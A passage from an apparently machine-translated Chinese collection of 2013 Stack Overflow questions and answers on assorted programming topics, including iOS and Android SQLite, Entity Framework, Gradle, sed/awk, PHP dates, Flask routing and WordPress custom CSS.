            [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 1)] forKey:@"LATITUDE"];
            [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 2)] forKey:@"LONGITUDE"];
            ////NSLog(@"Retrived Dict values %@",dictionaryAboutInfo);
            [dealersInfoArray addObject:dictionaryAboutInfo];
            [dictionaryAboutInfo release];
        }
    }
    [selectQuery release];
}
@catch (NSException *exception) {

}
@finally {
    sqlite3_finalize(statement);
    sqlite3_close(dbConnection);
} 
```

感谢提前

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:10:31.887

```
 BOOL  success;
NSFileManager *fileManager=[NSFileManager defaultManager];
success = [fileManager fileExistsAtPath:documentPath];
if (success) 
{
    NSLog(@"file found at the document path"); 
}
//bundle path
NSString *databasePathFromApp = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"address_locations.sqlite"];
[fileManager copyItemAtPath:databasePathFromApp toPath:documentPath error:nil]; 
```

sqlite3_open([documentPath UTF8String], &dbConnection);

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:28:28.837

我认为您的数据库文件在捆绑中，您正在从 documentDirectory.. 中检索数据库，而不是从捆绑中检索数据库！！！！

您可以将路径更改为

```
 NSString *documentPath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"locations.sqlite"]; 
```

# entity-framework - 使用数据服务中的实体框架 5 (EF5) 使用自引用实体时出错

> ID：14847290
> 
> 赞同：0
> 
> 时间：2013-02-13T05:54:31.060
> 
> 标签：entity-framework, wcf-data-services, entity-framework-5, entity-framework-4.3

我有一个公开我的 EF5 实体模型的 WCF 数据服务。这个特定的模型有两个自引用列。下面是模型。

```
public class Chunk
{
    [Key]
    public int Id { get; set; }

    [Required]
    public string Name { get; set; }

    /// <summary>
    /// Gets/sets the left chunk, which is used for chaining
    /// </summary>
    public int? LeftChunk_Id { get; set; }

    /// <summary>
    /// Gets/sets the right chunk, which is used for chaining
    /// </summary>
    public int? RightChunk_Id { get; set; }

    /// <summary>
    /// Gets/set any chunk that should be rendered to the left of this chunk
    /// </summary>
    [ForeignKey("LeftChunk_Id")]
    public virtual Chunk Left { get; set; }

    /// <summary>
    /// Gets/sets any chunk that should be rendered to the right of this chunk
    /// </summary>
    [ForeignKey("RightChunk_Id")]
    public virtual Chunk Right { get; set; }
} 
```

我还使用 Fluent 建立了关系。

```
modelBuilder.Entity<Chunk>()
    .HasOptional<Chunk>(o => o.Left)
    .WithMany()
    .HasForeignKey(o => o.LeftChunk_Id)
    .WillCascadeOnDelete(false);

modelBuilder.Entity<Chunk>()
    .HasOptional<Chunk>(o => o.Right)
    .WithMany()
    .HasForeignKey(o => o.RightChunk_Id)
    .WillCascadeOnDelete(false); 
```

然后是这个 WCF 数据服务，它公开了数据模型。

```
public class ContentStudio : DataService<ObjectContext>
{
    public static void InitializeService(DataServiceConfiguration config)
    {
        config.SetEntitySetAccessRule("Chunks", EntitySetRights.AllRead);

        config.DataServiceBehavior.MaxProtocolVersion = DataServiceProtocolVersion.V2;
    }

    protected override ObjectContext CreateDataSource()
    {
        ContentStudioDataContext ctx = new ContentStudioDataContext();

        var objectContext = ((IObjectContextAdapter)ctx).ObjectContext;

        objectContext.ContextOptions.ProxyCreationEnabled = false;
        return objectContext;
    }
} 
```

当我尝试在示例应用程序中连接到此数据服务时，我收到以下消息：

> 从属角色 Chunk_Left_Source 引用的属性必须是关系 MyNamespace.Chunk_Left 的引用约束中的从属角色所引用的 EntityType MyNamespace.Chunk 的键的子集。

对于 Chunk.Right，我收到了相同的消息。这只发生在 EF5 中。当我降级到 EF 4.3.1 时，它可以工作。我正在使用 VS 2012 和 .NET 4.5。如果有人可以帮助我解决这个问题，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T18:08:37.033

所以看起来这个问题的答案是使用升级后的 Microsoft.Data.Services 库而不是 .NET 4.5 附带的 System.Data.Services 库。我希望这可以帮助其他任何可能偶然发现这一点的人。

# browser - 在默认浏览器中打开 url 的 Gradle 任务

> ID：14847296
> 
> 赞同：11
> 
> 时间：2013-02-13T05:55:13.493
> 
> 标签：browser, task, gradle

如何从 gradle 任务在浏览器中打开 url？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-13T11:11:47.637

这样的事情应该做：

```
task openUrlInBrowser {
   doLast {
       java.awt.Desktop.desktop.browse "http://www.google.com".toURI()
   }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2019-09-28T13:30:46.533

我从[Robins 回答](https://stackoverflow.com/a/22708365/1020871)了一个函数来支持 windows 和 mac

```
def browse(path) {
    def os = org.gradle.internal.os.OperatingSystem.current()
    if (os.isWindows()) {
        exec { commandLine 'cmd', '/c', "start $path" }
    } else if (os.isMacOsX()) {
        exec { commandLine 'open', "$path" }
    }
} 
```

示例用法：

```
task browseTest {
    doLast {
        def file = project.file('build/reports/tests/testDebugUnitTest/index.html')
        browse file
        browse "https://stackoverflow.com/questions/14847296/gradle-task-to-open-a-url-in-the-default-browser"
    }
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-03-28T09:09:46.263

```
task showReport(type:Exec) {
  workingDir './build/reports/tests'

  //on windows:
  commandLine 'cmd', '/c', 'start index.html'
} 
```

然后运行

```
gradle showReport 
```

请参阅有关[Gradle exec](http://www.gradle.org/docs/current/dsl/org.gradle.api.tasks.Exec.html)的信息。

# linux - 使用 awk 以编号格式将单行拆分为多行

> ID：14847299
> 
> 赞同：4
> 
> 时间：2013-02-13T05:55:29.153
> 
> 标签：linux, shell, scripting, awk

我正在尝试使用 awk 命令将值拆分为三个部分。需要帮助才能闯入 3。

内容 =`1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %`

我希望上述内容在编号系统中分成 3 行。

需要样本输出：

```
1\. 11683 (<server01>: du.size[/,free] : 0.5 % 
2\. 21683 (<server02>: du.size[/,free] : 1.5 % 
3\. 31683 (<server03>: du.size[/,free] : 3.5 % 
```

我已经尝试过以下命令：

```
echo $content | awk -F"3\. " '{ print $2 }' 
```

我明白了

```
31683 (<server03>: du.size[/,free] : 3.5 % 
```

对于其他人来说也是如此，但仍然未能以正确的编号格式获得示例输出，如上所示。

谁可以帮我这个事 ？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T06:29:41.140

该`%`符号看起来是一个很好的分裂候选者。尝试：

```
sed 's/% /%\n/g' 
```

测试：

```
echo "1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %" | sed 's/% /%\n/g' 
```

结果：

```
1\. 11683 (<server01>: du.size[/,free] : 0.5 %
2\. 21683 (<server02>: du.size[/,free] : 1.5 %
3\. 31683 (<server03>: du.size[/,free] : 3.5 % 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-13T06:04:00.410

您可以`sed`改用：

```
sed "s#[^^]\([0-9]\.\) #\n\1 #g" 
```

例子：

```
[~/Desktop]
==> echo "1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %" | sed "s#[^^]\([0-9]
\.\) #\n\1 #g"
1\. 11683 (<server01>: du.size[/,free] : 0.5 %
2\. 21683 (<server02>: du.size[/,free] : 1.5 %
3\. 31683 (<server03>: du.size[/,free] : 3.5 % 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-15T06:04:01.193

```
perl -pe 's/(\d+\.\s)/\n$1/g' 
```

测试：

```
> echo "1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %" | perl -pe 's/(\d+\.\s)/\n$1/g'

1\. 11683 (<server01>: du.size[/,free] : 0.5 % 
2\. 21683 (<server02>: du.size[/,free] : 1.5 % 
3\. 31683 (<server03>: du.size[/,free] : 3.5 % 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T06:12:47.677

尝试

```
echo "1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %" | awk '{n = split($0,array,"%"); for (i = 0; i < n-1; ++i){gsub("^ ","",array[i+1]);print array[i+1]" %",i}}' 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-13T12:06:39.023

您的数据以元素数量显示。

```
{
    print $1, $2, $3, $4, $5, $6, $7
    print $8, $9, $10, $11, $12, $13, $14
    print $15, $16, $17, $18, $19, $20, $21
} 
```

如果您必须对数据做任何事情而不是打印它，这很有用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-06-15T19:47:42.953

对于适用于 Mac 的符合 POSIX 的答案：

```
sed -E $'s/ ([0-9]+\\. )/\\\n\\1/g' 
```

例子：

```
$ echo "1\. 11683 (<server01>: du.size[/,free] : 0.5 % 2\. 21683 (<server02>: du.size[/,free] : 1.5 % 3\. 31683 (<server03>: du.size[/,free] : 3.5 %" | sed -E $'s/ ([0-9]+\\. )/\\\n\\1/g'
1\. 11683 (<server01>: du.size[/,free] : 0.5 %
2\. 21683 (<server02>: du.size[/,free] : 1.5 %
3\. 31683 (<server03>: du.size[/,free] : 3.5 % 
```

# 这个怎么运作

## `-E`

打开更好的正则表达式语法，这样我们必须`+`匹配一个或多个东西，我们只需要`(...)`捕获组而不是`\(...\)`.

## `s/.../.../g`

`s/`进行字符串替换的方法。`/g`表示在第一次更换线路后不要停止。

## `/ ([0-9]+\. )/`

匹配`' 2\. '`和`' 3\. '`，并捕获`'2\. '`和`'3\. '`供以后使用。在捕获组之前包含前导空格可以避免在 之前添加额外的换行符`'1.'`，因为`'1.'`它位于行的开头并且之前没有空格。捕获中的尾随空格过滤掉诸如`'1.5'`.

## `/\n\1/`

`\n`是换行符，并且`\1`是第一个括号捕获组。

## `$'...'`和额外的反斜杠

给 sed 一个换行符的 POSIX 方法是先放一个 a `\`，然后是一个实际的换行符：

```
$ echo 'a#b' | sed 's/#/\
/'
a
b 
```

Linux 比较特殊，因为 GNU 扩展了 sed 来识别 sed `\n`，但是在其他版本的 sed 中（比如 Mac 上），`\n`不解释为换行符，我们需要使用 POSIX 格式。然而，为了使它成为一个单行，我们使用`$'...\\\n...'`它告诉 shell 解释转义序列。首先，`\\`编码 a `\`，然后`\n`换行。

# jsf-2 - 如何在 Primefaces 中动态添加文本框和日历？

> ID：14847300
> 
> 赞同：-1
> 
> 时间：2013-02-13T05:55:30.017
> 
> 标签：jsf-2, primefaces

我正在使用 JSF2+Primefaces 任何人都可以给我演示示例以在单击按钮时动态添加带有**日历组件的****文本框吗？**

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:04:13.247

如评论链接中所述，像这样使用：

```
<h:dataTable var="data" value=#{bean.listOfValues} rendered=#{bean.onClickofButton}>

  /* your input text box and calendar component comes here */
</h:dataTable> 
```

在支持 bean 中，您可以定义一个名为“onClickofButton”的布尔值，您可以通过单击按钮设置或重置它，还可以在命令按钮中提及“更新”属性以刷新 dataTable 组件。这里 bean 中的“listOfValues”是您要显示的值。

有关 primefaces 组件的更多信息，请查看他们的[展示](http://www.primefaces.org/showcase/ui/home.jsf)。希望这可以帮助！**

# c# - Server.Transfer 显示重复页面

> ID：14847301
> 
> 赞同：1
> 
> 时间：2013-02-13T05:55:31.763
> 
> 标签：c#, asp.net, .net

我在页面加载事件中调用了方法 DoSomething()：

```
protected void Page_Load(object sender, EventArgs e)
{
    try
    {
        DoSomething();        
    }
    catch
    {
        Server.Transfer('~/Error.aspx');
    }
} 
```

现在的问题是如果某些条件不满足，同时如果我`DoSomething`也抛出异常，那也会做一个. 现在我在浏览器中显示重复的错误页面。我该如何阻止这个？我希望无论我写5 次，它都应该只显示一次错误页面，而不是在 1 页中显示重复页面。`Server.Transfer``Error.aspx``Page_Load``Server.Transfer`

`Server.Transfer`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:24:22.303

嗯.. DoSomthing() 应该返回一个布尔值，告诉您它是否已经发出服务器传输？

```
protected void Page_Load(object sender, EventArgs e)
{
    bool serverTransferToErrorPage;
    try
    {
    serverTransferToErrorPage = DoSomething();
    // some more code that may throw execpetions..
         // ...
         // ...
    }
    catch
    {
    if(!serverTransferToErrorPage)
        Server.Transfer('~/Error.aspx');
    }
} 
```

当然，您的“DoSomthing()”方法应该看起来像这样：

```
private bool DoSomthing()
{
   try
   {
      return false;
   }
   catch
   {
      Server.Transfer('~/Error.aspx');
      return true;
   }
} 
```

# android - 在链中启动多个活动

> ID：14847305
> 
> 赞同：3
> 
> 时间：2013-02-13T05:55:43.477
> 
> 标签：android, android-activity

你好安卓开发者

我有三个活动，它们是在某种链条中开始的。

Activity A -> 有启动按钮，它启动 Activity B。

活动 B -> 取消按钮，它返回到活动 A。捕获按钮，它使用一些数据启动活动 C。

Activity C -> retake 按钮，返回到 Activity B 使用，它必须用一些数据恢复 Activity A。

我的问题是哪种方式是链式启动这些活动的正确方法，以及如何保持从活动 C 到 A 的流程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:03:34.357

意图是从一个活动转移到另一个活动的最佳方式。代码

```
public void onClick(View v)
{
    Intent myIntent = new Intent(A.this, B.class);
        startActivityForResult(myIntent, 0);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:02:37.650

您可以作为 startActivityForResult(intent,requestCode) 从 Activity B 启动 Activity C。当从活动 C 返回到 B 时，会执行 onActivityResult 的结果。

您可以为 C 到 A 执行相同的工作流程，反之亦然。参考[这个](https://stackoverflow.com/questions/10407159/android-how-to-manage-start-activity-for-result?answertab=votes#tab-top)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:20:56.677

**Activity A -> 有启动按钮，它启动 Activity B。**

开始新的活动，如

```
Intent myIntent = new Intent(A.this, B.class);
        startActivityForResult(myIntent); 
```

**活动 B -> 取消按钮，它返回到活动 A。捕获按钮，它使用一些数据启动活动 C。**

在取消按钮上，您可以简单地调用`finish()`，在捕获按钮上，您可以开始新的活动 C。

**Activity C -> retake 按钮，返回到 Activity B 使用，它必须用一些数据恢复 Activity A。**

在 retake 按钮上，您可以调用`finish()`，如果您想从 Activity A 获取一些输入，那么您应该调用`StartActivityForResult(1212)`并接收该代码以`onActivityResult` 进行您想要的操作并完成（） Activity A 完成后，它将自动重定向到活动 C，在活动 C 中，`onResume()`您可以检索该数据值。

# javascript - 使用相等运算符的 Javascript 函数和对象

> ID：14847310
> 
> 赞同：0
> 
> 时间：2013-02-13T05:56:01.103
> 
> 标签：javascript, function, object, equals, operator-keyword

我正在尝试从[https://developer.mozilla.org/en-US/docs/JavaScript/A_re-introduction_to_JavaScript](https://developer.mozilla.org/en-US/docs/JavaScript/A_re-introduction_to_JavaScript)了解 Javascript 概念。请看下面的代码；

```
function personFullName() {
  return this.first + ' ' + this.last;
}

function personFullNameReversed() {
  return this.last + ', ' + this.first; 
}

function Person(first, last) {
  this.first = first;
  this.last = last;
  this.fullName = personFullName;
  this.fullNameReversed = personFullNameReversed;
} 
```

我很困惑为什么函数 personFullName() 被称为

```
this.fullName = personFullName; 
```

为什么不叫like；

```
this.fullName = personFullName(); 
```

以下内容相同；

```
this.fullNameReversed = personFullNameReversed; 
```

我知道函数是 javascript 中的对象，但我无法理解这个概念？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:00:20.370

因为`Person`对象为自己分配了一个**方法**，而不是函数的结果。这就是它**不调用函数**的原因。

这样你就可以做到这一点。

```
var p = new Person("Matt", "M");
p.fullName(); // Returns "Matt M"
p.fullNameReversed(); // Returns "M, Matt" 
```

# php - 在php中将三个变量数据转换为日期格式

> ID：14847312
> 
> 赞同：2
> 
> 时间：2013-02-13T05:56:02.290
> 
> 标签：php, date, date-conversion

我有三个包含值的变量，如下所示

```
 $day=13
                       $month=2
                       $year=2013 
```

我想将这三个变量数据转换为 php 中的日期格式并存储在另一个变量 Ho 中以执行此操作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T06:02:26.080

PHP 并没有真正的日期变量类型，但它可以处理时间戳；可以使用以下方法创建这样的时间戳`mktime()`：

```
$ts = mktime(0, 0, 0, $month, $day, $year); 
```

然后可以使用它`date()`来格式化它：

```
$formatted = date('Y-m-d', $ts); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-13T06:04:58.417

处理这个问题的另一种方法是利用[`DateTime`](http://www.php.net/manual/en/datetime.construct.php)类

```
$date = new DateTime($year.'-'.$month.'-'.$day);
echo $date->format('Y-m-d'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:04:18.040

下面的代码将为您解决问题。根据需要将日期格式传递给`date()`函数。

```
echo date("M-d-Y", mktime(0, 0, 0, $month, $day, $year)); 
```

> 生产日期：2013 年 2 月 13 日

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:57:39.280

使用 strtotime： http: [//php.net/manual/en/function.strtotime.php](http://php.net/manual/en/function.strtotime.php)

```
$date_timestamp = strtotime($month . " " . $day . ", " . $year); 
```

这将返回一个时间戳，您可以使用它来创建日期：

```
$the_date = date("M d, Y", $date_timestamp); 
```

但是，如果您只想要这些日期的字符串：

```
$the_date = $month . " " . $day . ", " . $year; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-02-26T11:13:32.963

您可以使用 mktime() 函数

```
$ts = mktime(0, 0, 0,$month, $day, $year); 
```

然后将 $ts 传递给日期函数

```
$formatted = date('Y-m', $ts); 
```

# python - Flask：获取模块中每个 View 类的 URL

> ID：14847313
> 
> 赞同：1
> 
> 时间：2013-02-13T05:56:09.857
> 
> 标签：python, url, flask, introspection

我正在尝试构建所有 url 及其各自的 View 或 MethodView 类的列表。每个视图可能有 2 个或更多 url。我不确定是从课堂结束还是从 url 映射开始。我从类开始的问题是 url_for 只返回一个 url 并且端点名称可能与类/方法名称不同。这是用于构建似乎与 url 相关的 api 文档（针对最终用户）。

例子：

```
app = flask.Flask(__name__)

class Bar(View):

    def dispatch_request(self):
        pass
app.add_url_rule('/short/', view_func=Bar.as_view('bar'))
app.add_url_rule('/short/<bar>/', view_func=Bar.as_view('bar'))

if __name__ == '__main__':
    app.run() 
```

这里的目的是能够对模块执行自省并返回一个列表 Views 所有重定向到该 View 类或函数的 url。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T22:18:09.213

我想知道是否像：

```
rules = app.url_map._rules
for rule in rules:
    print rule.endpoint, rule, rule.defaults 
```

会给你你需要的信息。您可以[在 Werkzeug 文档](http://werkzeug.pocoo.org/docs/routing/#werkzeug.routing.Rule)中阅读更多信息。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T14:26:42.257

另一种方法是使用这样的东西。您可以将一个视图绑定到多个 URL。

```
@app.route('/short/')
@app.route('/short/<bar>')
def dispatch_request(bar=None):
    pass 
```

# security - 需要关于允许用户写入 CSS 文件的安全建议

> ID：14847315
> 
> 赞同：0
> 
> 时间：2013-02-13T05:56:13.283
> 
> 标签：security

我有一个 Wordpress 多站点安装，部分功能是加载存储在数据库中的 CSS（从父子 CSS 文件一次性复制的版本）（主题选项的 Wordpress 选项表部分）。此功能在主题选项面板中可用。

启用此功能后，父 CSS 和子 CSS 将被禁用，主题将从自定义 css 文件（custom.css）加载。这个 custom.css 的内容取自数据库（就像我在第一段中所说的那样）。在主题选项面板中，用户现在可以编辑整个 CSS，然后将其保存。保存后，它将写入包含更改的 custom.css 文件。

如果此方法安全，我需要您的想法。基本上，我已经使用以下 PHP 行清理了自定义 CSS（在将其保存到数据库之前）：

```
$sanitized_css = esc_html($original_css); 
```

其中 esc_html 是用于转义 HTML 块的 Wordpress 函数：http: [//codex.wordpress.org/Function_Reference/esc_html](http://codex.wordpress.org/Function_Reference/esc_html)

但我不确定这是否真的是最好的方法。我会很感激你的建议和想法。

我正在考虑不使用任何 CSS 文件直接（内联）将 CSS 输出到浏览器，这种方法是否也安全？但我知道从 CSS 文件加载始终是最佳实践，尤其是对于大型 CSS 文件。

我需要确保应用程序不受 XSS、MySQL 注入和其他安全风险的影响。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:01:05.547

一个快速的谷歌搜索会带来这个论坛的相关帖子：

[用户定义的 CSS：会出现什么问题？](https://stackoverflow.com/questions/5855398/user-defined-css-what-can-go-wrong)

[在 PHP 中清理用户定义的 CSS](https://stackoverflow.com/questions/3241616/sanitize-user-defined-css-in-php)

# java - java条件语句检查

> ID：14847316
> 
> 赞同：-1
> 
> 时间：2013-02-13T05:56:15.957
> 
> 标签：java, swing

我正在上一门 Java 课程，我有一个条件语句，我试图在不使用 if/if else 语句的情况下进行检查。我写它是为了检查一个空白的文本字段，但是......它不能正常工作。这是我写的代码的副本，谁能告诉我有什么问题？

```
String nameCheck = (nameField.getText() == "")? "Please enter a name" : "Hello, " + nameField.getText(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:58:37.903

你会想要更换

```
nameField.getText() == "" 
```

和

```
nameField.getText().equals(""); 
```

双等号运算符检查两个字符串是否是完全相同的对象，而“equals()”方法将检查字符串是否具有相同的值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:02:38.583

更好的方法可能是：

```
String nameCheck = (nameField.getText().trim().length() == 0)? "Please enter a name" : "Hello, " + nameField.getText(); 
```

这将检查字符串是否为空或充满空格。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T05:58:55.790

```
String nameCheck = (nameField.getText().equals(""))? "Please enter a name" : "Hello, " + nameField.getText(); 
```

# android - 发出给定号码的呼叫

> ID：14847320
> 
> 赞同：-2
> 
> 时间：2013-02-13T05:56:33.650
> 
> 标签：android

请给我一个关于如何使用 Android 为给定电话号码发送呼叫的示例或链接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:00:59.527

在您想拨打号码的地方添加这些代码行，如果您只想拨打号码，`dial`您可以使用 ACTION_DIAL 代替。

```
 Intent intent = new Intent(Intent.ACTION_CALL);
   intent.setData(Uri.parse("tel:1231231234"));
       startActivity(intent); 
```

不要忘记在清单文件中添加适当的权限。可能低于一

```
<uses-permission android:name="android.permission.CALL_PHONE"></uses-permission> 
```

或者

```
<uses-permission android:name="android.permission.CALL_PRIVILEGED"></uses-permission> 
```

# android - Android Sqlite 抛出空指针异常

> ID：14847321
> 
> 赞同：0
> 
> 时间：2013-02-13T05:56:37.410
> 
> 标签：android, android-sqlite

我正在尝试使用 Sqlite 插入值，但是在插入表时，它会抛出 nullpointerException。

这是我的数据库类：

```
public class FeedEntry extends SQLiteOpenHelper implements BaseColumns{

public static final String Table_Name = "Capture";
public static final String ColumnName_EmpCode = "EmpCode";
public static final String ColumnName_CallName = "CallName";
public static final String ColumnName_FirstName = "FirstName";
public static final String columnName_LastName = "LastName";

private static final String DATABASE_NAME = "Capture.db";
private static final int DATABASE_VERSION = 1;

private static final String DATABASE_CREATE = " create table "+Table_Name+"( "+ColumnName_EmpCode+" text, "
        +ColumnName_CallName+" text);";// "+COLUMN_NAME_PASSWORD+ " text );";

public FeedEntry(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
    // TODO Auto-generated constructor stub
}

@Override
public void onCreate(SQLiteDatabase db) {
    // TODO Auto-generated method stub
    db.execSQL(DATABASE_CREATE);

}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    // TODO Auto-generated method stub
    db.execSQL("DROP TABLE IF EXISTS " + Table_Name);
    onCreate(db);

} 
```

}

这是我的 DAO 课程：

```
public class CaptureDAO {

private static SQLiteDatabase dataBase;
private FeedEntry dbHelper = null;
private String[] allColumns = {FeedEntry.ColumnName_EmpCode, FeedEntry.ColumnName_CallName};

public CaptureDAO(Context context) {
    dbHelper = new FeedEntry(context);
}

public void open() throws SQLException {
    dataBase = dbHelper.getWritableDatabase();
}

public void close() {
    dbHelper.close();
}

public static void empDetails(String empCode, String callName){
    System.out.println("IN DAO CLASS "+empCode+" "+callName);
    ContentValues values = new ContentValues();
    System.out.println("In dao step 1");
    values.put(FeedEntry.ColumnName_EmpCode, empCode);
    System.out.println("In dao step 2");
    values.put(FeedEntry.ColumnName_CallName, callName);
    System.out.println("In dao step 3");

    long insertId = dataBase.insert(FeedEntry.Table_Name, null, values);
    System.out.println("InserId "+insertId);
    //Cursor cursor = dataBase.query(FeedEntry.Table_Name, allColumns, FeedEntry.ColumnName_EmpCode+" = "+insertId, null, null, null, null);

} 
```

}

我正在尝试在活动类中使用以下行插入值：

`CaptureDAO.empDetails(empCode.getText().toString(), empName.getText().toString());`

这是我的 LogCat：

```
02-13 05:42:59.295: E/AndroidRuntime(934): FATAL EXCEPTION: main
02-13 05:42:59.295: E/AndroidRuntime(934): java.lang.NullPointerException
02-13 05:42:59.295: E/AndroidRuntime(934):  at 

com.virinchi.capture.dao.CaptureDAO.empDetails(CaptureDAO.java:39)
02-13 05:42:59.295: E/AndroidRuntime(934):  at com.virinchi.capture.captureDirectory.CaptureActivity.showEmployees(CaptureActivity.java:139)
02-13 05:42:59.295: E/AndroidRuntime(934):  at com.virinchi.capture.bo.async.FetchEmployeeAsyncTask.onPostExecute(FetchEmployeeAsyncTask.java:101)
02-13 05:42:59.295: E/AndroidRuntime(934):  at com.virinchi.capture.bo.async.FetchEmployeeAsyncTask.onPostExecute(FetchEmployeeAsyncTask.java:1)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.os.AsyncTask.finish(AsyncTask.java:631)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.os.AsyncTask.access$600(AsyncTask.java:177)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:644)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.os.Handler.dispatchMessage(Handler.java:99)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.os.Looper.loop(Looper.java:137)
02-13 05:42:59.295: E/AndroidRuntime(934):  at android.app.ActivityThread.main(ActivityThread.java:5039)
02-13 05:42:59.295: E/AndroidRuntime(934):  at java.lang.reflect.Method.invokeNative(Native Method)
02-13 05:42:59.295: E/AndroidRuntime(934):  at java.lang.reflect.Method.invoke(Method.java:511)
02-13 05:42:59.295: E/AndroidRuntime(934):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
02-13 05:42:59.295: E/AndroidRuntime(934):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
02-13 05:42:59.295: E/AndroidRuntime(934):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:05:05.360

您需要将当前上下文传递`FeedEntry`给创建数据库。将上下文传递给`CaptureDAO`使用参数化构造函数并`static`从 `empDetails`方法中删除：

```
CaptureDAO CaptureDAOObj=new CaptureDAO(CaptureActivity.this);//<<pass context here
CaptureDAOObj.empDetails(empCode.getText().toString(),
                                     empName.getText().toString()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:08:18.697

**数据库**为空。在使用插入语句之前尝试对其进行初始化。

将构造函数更改为 -

```
public CaptureDAO(Context context) {
    dbHelper = new FeedEntry(context);
    dataBase = dbHelper.getWritableDatabase(); // initialize ur db here
} 
```

在活动使用中 -

```
 CaptureDAO captureDao = new CaptureDAO(getApplicationContext());
    captureDao.empDetails("ËmpCode", "empName"); 
```

希望这可以帮助。

# asp.net - 如何在asp.net中获取Sigma网格的记录数

> ID：14847322
> 
> 赞同：2
> 
> 时间：2013-02-13T05:56:38.130
> 
> 标签：asp.net, sigma-grid-control

我在 asp.net 项目中使用[Sigma 网格。](http://www.sigmawidgets.com/products/sigma_grid2/)如果数据库返回 null，我想显示没有找到记录。我尝试了一些方法，例如：

```
var grid = Sigma.$grid(grid_demo_id);
var test1 = grid.dataset.getSize(); 
```

但无论是否是记录，它总是返回-1。

我在下面粘贴我的代码：

```
 var grid_demo_id = "myGrid1";
        var dsOption = {
            fields: [
        { name: 'col1' },
        { name: 'col2' }
        ],
            recordType: 'array'
        }

        var colsOption = [
    { id: 'col1', header: "Col1", width: 105 },
    { id: 'col2', header: "Col2", width: 131 }
];

        var gridOption = {
            id: grid_demo_id,
            loadURL: 'Controller.aspx?P=Location&LocationId=' + globalLocation + '&' +strDate,
            width: "448",
            height: "239",
            container: 'tabcontainer',
            replaceContainer: true,
            encoding: 'UTF-8', // Sigma.$encoding(), 
            dataset: dsOption,
            columns: colsOption,
            clickStartEdit: true,
            defaultRecord: { 'col1': "00", 'col2': ""},
            pageSize: 7,
            pageSizeList: [7, 14, 21],
            toolbarPosition: 'bottom',
            toolbarContent: 'reload | nav | goto | pagesize | print '
        };

        var mygrid = new Sigma.Grid(gridOption);

        Sigma.Util.onLoad(function () { mygrid.render() });

        var grid = Sigma.$grid(grid_demo_id);
        var test1 = grid.dataset.getSize();
        alert(test1);
        if (test1 === -1) {
            alert('In');
            document.getElementById('DivGridView').innerHTML = '<div id=\'divRec\'style=\'float:left;\'>No Record found.</div>';
            document.getElementById('tabcontainer').style.display = "none";
        }
        else {
            document.getElementById('tabcontainer').style.display = "block";
            document.getElementById('DivGridView').style.display = "none";
